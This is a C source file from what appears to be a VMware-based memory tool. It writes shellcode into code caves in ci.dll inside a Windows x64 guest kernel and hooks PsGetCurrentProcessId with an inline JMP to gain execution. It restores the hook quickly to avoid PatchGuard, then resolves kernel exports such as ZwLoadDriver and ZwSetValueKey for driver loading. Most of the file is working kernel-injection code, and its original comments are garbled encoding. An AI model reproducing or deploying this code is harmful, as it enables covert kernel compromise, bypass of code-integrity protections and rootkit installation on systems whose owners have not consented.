#include "ShellCode.h"
#include "WindowsNt.h"
#include "VmWareApp.h"
#include "misc.h"
#include "KernelModeInject.h"
#include "pe.h"
#include "Win10X64Stage3.h"

#define MAX_SHELLCODE 0xc00

DWORD gCommPhyAddr = 0;


BOOLEAN KMJInitializeVmKernelFunctions(KMJDATA* pk);


BOOLEAN KMIGetWinLdrModuleInfo(_In_ CHAR* VmModuleName, _Out_ VM_LDR_MODULE_INFO* VmLdrModuleInfo)
{
	BOOLEAN bRet = FALSE;
	int iCharConv = 0;
	PLIST_ENTRY NextEntry = NULL;
	LDR_MODULE64 LdrData = { 0 };
	WCHAR BaseDllNameWchar[MAX_PATH] = { 0 };
	LDR_MODULE64* DataTableEntry = NULL;
	CHAR* BaseDllNameChar = NULL;

	do
	{
if (NULL == VmModuleName || NULL == VmLdrModuleInfo) {
	break;
}

if (NULL == VMGetNtKernelData()->PsLoadedModuleListPtr) {
	break;
}

if (!VMReadVmVirtualAddr(&NextEntry,
	VMGetNtKernelData()->MemoryKernelDirbase,
	(DWORD64)VMGetNtKernelData()->PsLoadedModuleListPtr,
	sizeof(PLIST_ENTRY))) {
	break;
}

while (NextEntry != VMGetNtKernelData()->PsLoadedModuleListPtr) {

	DataTableEntry = CONTAINING_RECORD(NextEntry,
		LDR_MODULE64,
		InLoadOrderModuleList);

	//�õ�LDR����
	if (!VMReadVmVirtualAddr(&LdrData,
		VMGetNtKernelData()->MemoryKernelDirbase,
		(DWORD64)DataTableEntry,
		sizeof(LDR_MODULE64))) {
		break;
	}

	//�õ�UNICODE�ṹ����
	if (!VMReadVmVirtualAddr(
		&BaseDllNameWchar, VMGetNtKernelData()->MemoryKernelDirbase,
		(DWORD64)LdrData.BaseDllName.Buffer,
		LdrData.BaseDllName.Length)) {
		break;
	}

	iCharConv = WcharToChar(BaseDllNameWchar, &BaseDllNameChar);

	if (!iCharConv) {
		break;
	}
	if (_stricmp(VmModuleName, BaseDllNameChar) == 0) {
		VmLdrModuleInfo->BaseAddress = LdrData.BaseAddress;
		VmLdrModuleInfo->EntryPoint = LdrData.EntryPoint;
		bRet = TRUE;
		break;
	}

	free(BaseDllNameChar);
	RtlZeroMemory(BaseDllNameWchar, MAX_PATH);

	if (!VMReadVmVirtualAddr(
		&NextEntry, VMGetNtKernelData()->MemoryKernelDirbase,
		(DWORD64)NextEntry,
		sizeof(PLIST_ENTRY))) {
		break;
	}
}

	} while (FALSE);

	if (BaseDllNameChar) {
		free(BaseDllNameChar);
	}

	return bRet;
}

BOOLEAN KMIGetWinModuleInfo(_In_ CHAR* VmModuleName, _In_ BOOLEAN KernelMode, _Out_ VM_LDR_MODULE_INFO* VmModuleInfo)
{
	//�ں�ģʽ��LDR���û�ģʽ��PEB������ʵ���û�ģʽ
	return KernelMode ? KMIGetWinLdrModuleInfo(VmModuleName, VmModuleInfo) : FALSE;

}


BOOLEAN KMIKernelInject()
{
	BOOLEAN bRet = FALSE;
	BOOLEAN bReadAddr = TRUE;
	BOOLEAN bReadVmStatus = TRUE;
	BOOLEAN bRestoreHook = FALSE;
	DWORD64 ShellCodeInject = 0;
	VM_LDR_MODULE_INFO  VmLdrModuleInfo = { 0 };
	PIMAGE_SECTION_HEADER Sections = NULL;
	DWORD SectionNumber = 0;
	DWORD64 SectionsBaseAddr = 0;
	DWORD64 ExecBlock = 0;
	DWORD64 DataBlock = 0;
	DWORD DataVerification = 0;
	DWORD64 NeedHookAddr = 0;
	DWORD64 HookAddr = 0;
	BYTE HookOriginalData[0x14] = { 0 };
	BYTE HookTranslationData[13] = { 0 };
	DWORD HookJMP = 0;
	BYTE ShellCode[MAX_SHELLCODE] = { 0 };
	BYTE ShellcodeVerify[MAX_SHELLCODE] = { 0 };
	BYTE DataZero[0x20] = { 0 };
	DWORD ShellCodeLen = 0;
	KMJDATA pk = { 0 };
	
	do
	{
		//1.��ShellCode���ƽ���(Ŀǰֻʵ����X64)
		ShellCodeLen = sizeof(WINX64_SHELLCODE);
		if (ShellCodeLen > MAX_SHELLCODE) {
			break;
		}
		memcpy(ShellCode, WINX64_SHELLCODE, ShellCodeLen);

		//�õ���ַ
		if(!KMIGetWinLdrModuleInfo("ci.dll", &VmLdrModuleInfo)){
			printf("KMIKernelInject-Failed to get module information.\n");
			break;
		}
		//�õ�SectionNumber
		SectionNumber = PEGetSectionNumber(VmLdrModuleInfo.BaseAddress);
		if (!SectionNumber) {
			break;
		}
		//�õ�SectionsBaseAddr
		SectionsBaseAddr = PEGetSectionsBaseAddr(VmLdrModuleInfo.BaseAddress);
		if (!SectionsBaseAddr)
		{
			break;
		}
		//����ռ�
		Sections = LocalAlloc(LMEM_ZEROINIT, SectionNumber * sizeof(IMAGE_SECTION_HEADER));
		if (!Sections) {
			break;
		}
		if (!VMReadVmVirtualAddr(Sections,
			                     VMGetNtKernelData()->MemoryKernelDirbase,
			                     SectionsBaseAddr,
			                     SectionNumber * sizeof(IMAGE_SECTION_HEADER))) {
			break;
		}

		for (DWORD i = 0; i < SectionNumber; i++) {
			if (!strcmp("INIT",(const char*)Sections[i].Name)) {
				ExecBlock = VmLdrModuleInfo.BaseAddress + Sections[i].VirtualAddress + 0x400;
			}
			if (!strcmp(".data", (const char*)Sections[i].Name)) {
				DataBlock = ((VmLdrModuleInfo.BaseAddress + Sections[i].VirtualAddress + Sections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - 0x20;
			}
		}
		if (!ExecBlock || !DataBlock){
			printf("KMJ:Failed Get Code/Data Cave(CI.DLL).\n");
			break;
		}
		//�ҵ�ҪHOOK�ĵ�ַ
		NeedHookAddr = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "PsGetCurrentProcessId", TRUE);
		if (!NeedHookAddr)
		{
			break;
		}

		if (!VMReadVmVirtualAddr(HookOriginalData,
                                 VMGetNtKernelData()->MemoryKernelDirbase,
                                 (DWORD64)NeedHookAddr,
                                 sizeof(HookOriginalData))) {
			break;
		}
		//�Ƿ��Ѿ�HOOK��
		if ((HookOriginalData[0x00] == 0xE9)) {
			bRestoreHook = TRUE;
			printf("KMJ: Hook already inserted.\n");
			break;
		}

		HookAddr= (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "KeGetCurrentIrql", TRUE);
		ShellCodeInject = HookAddr ? (*(PDWORD64)(ShellCode + 0x020) = HookAddr) : FALSE;
		if (!ShellCodeInject){
			break;
		}
		HookAddr = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "PsCreateSystemThread", TRUE);
		ShellCodeInject = HookAddr ? ((*(PDWORD64)(ShellCode + 0x028) = HookAddr)) : FALSE;
		if (!ShellCodeInject) {
			break;
		}
		HookAddr = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ZwClose", TRUE);
		ShellCodeInject = HookAddr ? (*(PDWORD64)(ShellCode + 0x030) = HookAddr) : FALSE;
		if (!ShellCodeInject) {
			break;
		}
		HookAddr = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "MmAllocateContiguousMemory", TRUE);
		ShellCodeInject = HookAddr ? (*(PDWORD64)(ShellCode + 0x038) = HookAddr) : FALSE;
		if (!ShellCodeInject) {
			break;
		}
		HookAddr = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "MmGetPhysicalAddress", TRUE);
		ShellCodeInject = HookAddr ? (*(PDWORD64)(ShellCode + 0x040) = HookAddr) : FALSE;
		if (!ShellCodeInject) {
			break;
		}
		HookAddr = VMGetNtKernelData()->MemoryKernelBase;
		ShellCodeInject = HookAddr ? (*(PDWORD64)(ShellCode + 0x048) = HookAddr) : FALSE;
		if (!ShellCodeInject) {
			break;
		}
		//Դ����
		*(PDWORD64)(ShellCode + 0x018) = DataBlock;
		memcpy(ShellCode + 0x004, HookOriginalData, sizeof(HookOriginalData));

		//д���ڴ棬����֤д���Ƿ���ȷ	
		if (!VMWriteVmVirtualAddr(ShellCode, 
			                      VMGetNtKernelData()->MemoryKernelDirbase,
                                  ExecBlock,
			                      sizeof(ShellCode))){
			break;
		}

		//��֤,�Ƿ�д����ȷ
		if (!VMReadVmVirtualAddr(ShellcodeVerify,
			                     VMGetNtKernelData()->MemoryKernelDirbase,
			                     ExecBlock,
			                     sizeof(ShellcodeVerify))) {
			break;
		}

		if (memcmp(ShellCode, ShellcodeVerify, sizeof(ShellCode))){
			break;
		}

		if ((NeedHookAddr - ExecBlock > 0x7fff0000) && (ExecBlock - NeedHookAddr > 0x7fff0000)) {
			// ���Ե�ַJMP [MOV r10, addr / JMP r10]
			HookTranslationData[0] = 0x49;
			HookTranslationData[1] = 0xBA;
			*(PDWORD64)(HookTranslationData + 2) = ExecBlock;
			HookTranslationData[10] = 0x41;
			HookTranslationData[11] = 0xFF;
			HookTranslationData[12] = 0xE2;
		}
		else {
			// ��Ե�ַJMP
			HookTranslationData[0] = 0xE9;   // JMP
			*(PDWORD)(HookTranslationData + 1) = (HookJMP = (DWORD)(ExecBlock - (NeedHookAddr + 5ULL)));
		}

		//д��PsGetCurrentProcessId������ִ����ɺ����ϻ�ԭ��˲��HOOK�Լ��ٱ�PG�Ļ���
		if (!VMWriteVmVirtualAddr(HookTranslationData, 
			                      VMGetNtKernelData()->MemoryKernelDirbase,
			                      NeedHookAddr, 
			                      sizeof(HookTranslationData))) {

			break;
		}

		bRestoreHook = TRUE;
		//�ȴ�����ִ��
		printf("KMJ: Code inserted into the kernel - Waiting to receive execution.\n");
		do {
			Sleep(100);
			if (!VMReadVmVirtualAddr(&DataVerification,
				                     VMGetNtKernelData()->MemoryKernelDirbase,
				                     DataBlock+0x1c,
				                     sizeof(DWORD))) {
				bReadAddr = FALSE;
				break;
			}
		} while (DataVerification == 0);

		if(!bReadAddr){
			break;
		}

		//���ｫͨ�Žṹ�������ַ��������
		gCommPhyAddr = DataVerification;		

		do {
			if (!VMReadHostRegion(&pk, gCommPhyAddr, sizeof(KMJDATA))) {
				bReadVmStatus = FALSE;
				break;
			}
			Sleep(100);
		} while (pk.opStatus != 1);

		if (!bReadVmStatus) {
			break;
		}


		//(�ⲿ�ֿ�ʼ�Ƿ���ShellCode����)VmWare�����ShellCode��������̫�󣬺ܶ����ݴ���Ū���������ʵ��
		if(!KMJInitializeVmKernelFunctions(&pk)){
			break;
		}
		if (!VMWriteHostRegion(&pk, gCommPhyAddr, sizeof(KMJDATA))) {
			break;
		}
		bRet = TRUE;

	} while (FALSE);

	if (bRestoreHook)
	{
		if (!VMWriteVmVirtualAddr(HookOriginalData,
			                      VMGetNtKernelData()->MemoryKernelDirbase,
			                      NeedHookAddr,
			                      sizeof(HookOriginalData))) {

			printf("KMJ��Failed to perform HOOK restore.\n");
		}

		if (!VMWriteVmVirtualAddr(DataZero,
			                      VMGetNtKernelData()->MemoryKernelDirbase,
			                      DataBlock,
			                      sizeof(HookOriginalData))) {

			printf("KMJ��Failed to perform data recovery.\n");
		}

	}

	if (Sections) {
		LocalFree(Sections);
	}
	
	return bRet;
	
}

BOOLEAN KMJInitializeVmKernelFunctions(KMJDATA* pk)
{
	BOOLEAN bRet = FALSE;
	DWORD64  RetAddr = 0;
	do
	{
		RetAddr = *((PDWORD64)&pk->fn + FUN_ExFreePool) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ExFreePool", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_MmGetPhysicalAddress) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "MmGetPhysicalAddress", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_PsCreateSystemThread) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "PsCreateSystemThread", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlCopyMemory) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "RtlCopyMemory", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlZeroMemory) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "RtlZeroMemory", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlInitAnsiString) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "RtlInitAnsiString", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlInitUnicodeString) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "RtlInitUnicodeString", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlAnsiStringToUnicodeString) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "RtlAnsiStringToUnicodeString", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_KeDelayExecutionThread) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "KeDelayExecutionThread", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwLoadDriver) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ZwLoadDriver", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwUnloadDriver) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ZwUnLoadDriver", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwQuerySystemInformation) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ZwQuerySystemInformation", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_stricmp) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "_stricmp", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ExAllocatePool) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ExAllocatePool", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwClose) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ZwClose", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwCreateFile) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ZwCreateFile", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlFreeUnicodeString) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "RtlFreeUnicodeString", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwCreateKey) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ZwCreateKey", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwSetValueKey) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "ZwSetValueKey", TRUE);
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_wcscat) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "wcscat", TRUE);
		if (!RetAddr) {
			break;
		}

		RetAddr = *((PDWORD64)&pk->fn + FUN_DbgBreakPoint) = (DWORD64)VMGetExportsFunAddr((DWORD64)VMGetModuleBaseAddr(NT_KERNEL_ID), "DbgBreakPoint", TRUE);;
		if (!RetAddr) {
			break;
		}

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

DWORD KMJGetCommPhyAddr()
{
	return gCommPhyAddr;
}


